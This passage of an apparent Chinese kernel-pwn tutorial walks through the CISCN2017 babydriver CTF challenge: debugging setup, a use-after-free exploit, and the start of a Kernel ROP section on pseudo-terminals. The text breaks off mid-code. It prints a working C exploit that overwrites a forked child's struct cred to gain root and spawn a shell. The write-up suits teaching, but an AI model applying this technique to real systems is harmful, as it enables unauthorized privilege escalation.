\</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<blockquote>
<p>exploit 需要静态编译，因为 kernel 不提供标准库，但一定提供 syscall。</p>
</blockquote>
</li>
<li>
<p>获取 vmlinux</p>
<p>我们可以使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a> 工具，从 bzImage 中解压出 vmlinux。</p>
<blockquote>
<p>直接让 gdb 加载 bzImage 时将无法加载到任何 kernel 符号，</p>
<p>因此需要先从 bzImage 中解压出 vmlinux， 再来让 gdb 加载符号。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</span><br><span class="line">chmod +x ./extract-vmlinux</span><br><span class="line"><span class="built_in">cd</span> CISCN2017-babydriver/babydriver/</span><br><span class="line">../../extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<p>但实际上，解压出来的 vmlinux 的函数名称全部为 <code>sub_xxxx</code>，不方便调试。即便所有的内核符号与函数名称的信息全部位于内核符号表中（或者 <code>/proc/kallsyms</code>），但一个个对应过去也相当麻烦。</p>
<p>因此还有一个工具可以使用：<code>vmlinux-to-elf</code></p>
<blockquote>
<p>使用这个工具之前系统中必须装有<strong>高于3.5</strong>版本的python</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>
<p>使用方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span></span><br><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>
<p>之后解压出来的 vmlinux 就是带符号的，可以正常被 gdb 读取和下断点。</p>
</li>
<li>
<p>查看当前 bzImage 所对应的内核版本，并下载该版本的内核代码（如果有需要，想更细致的研究内核的话）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ strings bzImage | grep <span class="string">"gcc"</span> <span class="comment"># 或者 `file bzImage` 命令</span></span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class="comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017</span></span><br><span class="line"></span><br><span class="line">$ curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-4.4.72.tar.xz</span><br><span class="line">$ unxz linux-4.4.72.tar.xz</span><br><span class="line">$ tar -xf linux-4.4.72.tar</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动 kernel 后，别忘记在 gdb 中使用 <code>add-symbol-file</code> 加载 ko 的符号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in kernel shell:</span></span><br><span class="line">/ $ lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># in gdb:</span></span><br><span class="line">gef➤  add-symbol-file babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最终设置的 mygdbinit 如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64</span><br><span class="line">add-symbol-file vmlinux</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 先 <span class="built_in">continue</span>， 在 insmod 之后手动 Ctrl+C 再设置断点，免得断点处于 pending 状态</span></span><br><span class="line">add-symbol-file babydriver.ko 0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">b babyread</span><br><span class="line">b babywrite</span><br><span class="line">b babyioctl</span><br><span class="line">b babyopen</span><br><span class="line">b babyrelease</span><br><span class="line"></span><br><span class="line">c</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-kernel-的-UAF-利用">5. kernel 的 UAF 利用</h3>
<h4 id="a-覆写-cred-结构体">a. 覆写 cred 结构体</h4>
<p>UAF 的常规利用是通过悬垂指针来修改某块特定内存上的数据，因此在这里我们可以试着：</p>
<ul>
<li>先让一个悬垂指针指向一块已被释放的内存</li>
<li>执行 fork 操作，使 fork 时给新子进程分配的 <code>struct cred</code> 结构体重新分配这块内存</li>
<li>利用悬垂指针来随意修改这块内存上的 <code>struct cred</code> 结构体，达到提权的效果</li>
</ul>
<p><code>struct cred</code> 结构体用于 <strong>保存每个进程的权限</strong>，其结构如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *  task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *  upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  subscribers;  <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">  <span class="keyword">void</span>    *put_addr;</span><br><span class="line">  <span class="keyword">unsigned</span>  magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">kuid_t</span>    uid;    <span class="comment">/* real UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    gid;    <span class="comment">/* real GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    suid;    <span class="comment">/* saved UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    sgid;    <span class="comment">/* saved GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    euid;    <span class="comment">/* effective UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    egid;    <span class="comment">/* effective GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    fsuid;    <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    fsgid;    <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  <span class="keyword">unsigned</span>  securebits;  <span class="comment">/* SUID-less security management */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_bset;  <span class="comment">/* capability bounding set */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_ambient;  <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  jit_keyring;  <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">           * keys to */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">  <span class="keyword">void</span>    *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>  <span class="comment">/* real user ID subscription */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>  <span class="title">rcu</span>;</span>    <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>新进程的 <code>struct cred</code> 结构体分配的代码位于 <code>_do_fork -&gt; copy_process -&gt; copy_creds -&gt; prepare_creds</code> 函数调用链中。</p>
<p>为了避开繁琐的内存分配利用，精简利用方式，我们只需要让 babydriver 中释放的 <code>device_buf</code> 内存的大小与 <code>sizeof(struct cred)</code>一致即可，这样便可以让内核在为 struct cred 分配内存时，分配到刚释放不久的 device_buf 内存。</p>
<p>由于当前 bzImage 解压出来的 vmlinux 没有<strong>结构体</strong>符号，因此我们可以直接根据默认参数编译出一个新的 vmlinux，并加载该 vmlinux 来获取 <code>struct cred</code> 结构体的大小：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p sizeof(struct cred)</span><br><span class="line"><span class="variable">$1</span> = 0xa8</span><br></pre></td></tr></table></figure>
<p>执行完 <code>babyrelease</code> 函数之后，<code>device_buf</code>就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行<code>close(fd)</code>之后，该进程将无法再使用这个文件描述符，因此没有办法在<code>close</code>后再利用这个 fd 去进行写操作。</p>
<p>但我们可以利用 babydriver 中的<strong>变量全是全局变量</strong>的这个特性，同时执行两次 open 操作，获取两个 fd。这样即便一个 fd 被 close 了，我们仍然可以利用另一个 fd 来对 <code>device_buf</code> 进行写操作。</p>
<p>这样一套完整的利用流程就出来了，exploit 如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0xa8</span>);    <span class="comment">// realloc</span></span><br><span class="line">    close(fd1); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to overwrite struct cred</span></span><br><span class="line">        <span class="keyword">char</span> mem[<span class="number">4</span> * <span class="number">7</span>]; <span class="comment">// usage uid gid suid sgid euid egid</span></span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="string">'\x00'</span>, <span class="keyword">sizeof</span>(mem));</span><br><span class="line">        write(fd2, mem, <span class="keyword">sizeof</span>(mem));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get shell</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] after LPE, privilege: %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// parent</span></span><br><span class="line">        waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。</p>
</blockquote>
<p>利用结果：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007082752272.png" alt="image-20211007082752272"></p>
<h4 id="b-Kernel-ROP">b. Kernel ROP</h4>
<h5 id="1-终端设备类型简介">1) 终端设备类型简介</h5>
<p>在 Linux 中 <code>/dev</code> 目录下，终端设备文件通常有以下几种：</p>
<blockquote>
<p>注意：以下这些类型的终端不一定在所有发行版 linux 上都存在，例如 <code>/dev/ttyprintk</code> 就不存在于我的 kali linux 上。</p>
</blockquote>
<ol>
<li>
<p>串行端口终端 （<strong>/dev/ttySn</strong>） ：是用于与串行端口连接的终端设备，类似于 Windows 下的 COM。</p>
</li>
<li>
<p>控制终端 （<strong>/dev/tty</strong>） ：<strong>当前进程</strong>的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件。</p>
<blockquote>
<p>可以使用 <code>tty</code> 命令查看其具体对应的终端设备，也可以使用 <code>ps -ax</code> 来查看进程与控制终端的映射关系。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007225628587.png" alt="image-20211007225628587"></p>
<blockquote>
<p>在 qemu 下，可以通过指定<code>-append 'console=ttyS0'</code> 参数，设置 linux kernel tty 映射至 <code>/dev/ttySn</code> 上。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007230821016.png" alt="image-20211007230821016"></p>
</li>
<li>
<p>虚拟终端与控制台 （<strong>/dev/ttyN, /dev/console</strong>） ：在Linux 系统中，计算机显示器通常被称为<strong>控制台终端</strong> (Console)。而在 linux <strong>初始字符界面</strong>下，为了同时处理多任务，自然需要多个终端的切换。这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为<strong>虚拟终端</strong>。</p>
<blockquote>
<p>虚拟终端和控制台的差别需要参考历史。在以前，终端是通过串口连接上的，不是计算机本身就有的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。</p>
<p>简单的说，<strong>控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备</strong></p>
<p>计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。也就是说，控制台是计算机的基本设备，而终端是附加设备。</p>
<p>由于控制台也有终端一样的功能，控制台有时候也被模糊的统称为终端。</p>
<p>计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。</p>
<p>由于时代的发展，硬件资源的丰富，终端和控制台的概念已经慢慢淡化。</p>
</blockquote>
<p>这种虚拟终端的切换与我们X11中图形界面中多个终端的切换不同，它属于<strong>更高级别终端的切换</strong>。我们日常所使用的图形界面下的终端，属于某个<strong>虚拟图形终端界面</strong>下的多个<strong>伪终端</strong>。</p>
<p>可以通过键入 <code>Ctrl+Alt+F1</code> （其中的 F<strong>x</strong> 表示切换至第 <strong>x</strong> 个终端，例如 F1）来切换虚拟终端。</p>
<blockquote>
<p>tty0则是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上。</p>
</blockquote>
<p>默认情况下，F1-F6均为字符终端界面，F7-F12为图形终端界面。</p>
<blockquote>
<p>当切换至字符终端界面后，可再次键入 <code>Ctrl+Alt+F7</code>切回图形终端界面。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007231737902.png" alt="image-20211007231737902"></p>
</li>
<li>
<p>伪终端 （<strong>/dev/pty</strong>）：<strong>伪终端(Pseudo Terminal)<strong>是成对的</strong>逻辑</strong>终端设备，其行为与普通终端非常相似。所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口。</p>
<p>当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。</p>
<p>伪终端的两个终端设备分别称为 master 设备和 slave 设备，其中 slave 设备的行为与普通终端无异。</p>
<p>当某个程序把某个 master 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 slave 设备。通常 slave 设备也会被其他程序用于读写。因此这两个程序便可以通过这对逻辑终端来进行通信。</p>
<p>现代 linux 主要使用 <strong>UNIX 98 pseudoterminals</strong> 标准，即 <strong>pts(pseudo-terminal slave, /dev/pts/n)</strong> 和 <strong>ptmx(pseudo-terminal master, /dev/ptmx)</strong> 搭配来实现 pty。</p>
<p>伪终端的使用一会将在下面详细说明。</p>
</li>
<li>
<p>其他终端 （诸如 <strong>/dev/ttyprintk</strong> 等等）。这类终端通常是用于特殊的目的，例如 <strong>/dev/ttyprintk</strong> 直接与内核缓冲区相连：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007233344098.png" alt="image-20211007233344098"></p>
</li>
</ol>
<h5 id="2-伪终端的使用">2) 伪终端的使用</h5>
<p>伪终端的具体实现分为两种</p>
<ul>
<li>UNIX 98 pseudoterminals，涉及 <code>/dev/ptmx</code> （master）和 <code>/dev/pts/*</code>（slave）</li>
<li>老式 BSD pseudoterminals，涉及 <code>/dev/pty[p-za-e][0-9a-f]</code>(master) 和 <code>/dev/tty[p-za-e][0-9a-f]</code>(slave)</li>
</ul>
<p>这里我们只介绍 UNIX 98 pseudoterminals。</p>
<p><code>/dev/ptmx</code>这个设备文件主要用于打开一对伪终端设备。当某个进程 open 了 <code>/dev/ptmx</code>后，该进程将获取到一个指向 <strong>新伪终端master设备（PTM）</strong> 的文件描述符，同时对应的 <strong>新伪终端slave设备（PTS）</strong> 将在 <code>/dev/pts/</code>下被创建。不同进程打开 <code>/dev/ptmx</code> 后所获得到的 PTM、PTS 都是互不相同的。</p>
<p>进程打开 /dev/ptmx 有两种方式</p>
<ol>
<li>
<p>手动使用 <code>open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)</code> 打开</p>
</li>
<li>
<p>通过标准库函数 <code>getpt</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通过标准库函数 <code>posix_openpt</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">posix_openpt</span><span class="params">(<span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>上述几种方式完全等价，只是<strong>使用标准库函数</strong>的方式会更通用一点，因为 ptmx 在某些 linux 发行版上可能不位于 <code>/dev/ptmx</code>，同时标准库函数还会做其他额外的检测逻辑。</p>
</blockquote>
<p>进程可以调用<code>ptsname(ptm_fd)</code>来获取到对应的 PTS 的路径。</p>
<p>需要注意的是，必须先顺序调用以下两个函数后才能打开 PTS:</p>
<ol>
<li><code>grantpt(ptm_fd)</code>：更改 slave 的模式和所有者，获取其所有权</li>
<li><code>unlockpt(ptm_fd)</code>：对 slave 解锁</li>
</ol>
<p>伪终端主要用于两个应用场景</p>
<ul>
<li>终端仿真器，为其他远程登录程序（例如 ssh）提供终端功能</li>
<li>可用于向<strong>通常拒绝从管道读取输入</strong>的程序（例如 su 和 passwd）发送输入</li>
</ul>
<p>上述几步是使用伪终端所必须调用的一些底层函数。但在实际的伪终端编程中，更加常用的是以下几个函数：</p>
<blockquote>
<p>我们可以通过阅读这些函数的源代码来了解伪终端的使用方式。</p>
</blockquote>
<ul>
<li>
<p><code>openpty</code>：找到一个空闲的伪终端，并将打开好后的 master 和 slave 终端的文件描述符返回。源代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create pseudo tty master slave pair and set terminal attributes</span></span><br><span class="line"><span class="comment">   according to TERMP and WINP.  Return handles for both ends in</span></span><br><span class="line"><span class="comment">   AMASTER and ASLAVE, and return the name of the slave end in NAME.  */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">openpty (<span class="keyword">int</span> *amaster, <span class="keyword">int</span> *aslave, <span class="keyword">char</span> *name,</span><br><span class="line">  <span class="keyword">const</span> struct termios *termp, <span class="keyword">const</span> struct winsize *winp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  <span class="keyword">char</span> _buf[PATH_MAX];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">char</span> _buf[<span class="number">512</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">char</span> *buf = _buf;</span><br><span class="line">  <span class="keyword">int</span> master, ret = <span class="number">-1</span>, slave = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  *buf = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  master = getpt ();</span><br><span class="line">  <span class="keyword">if</span> (master == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (grantpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlockpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> 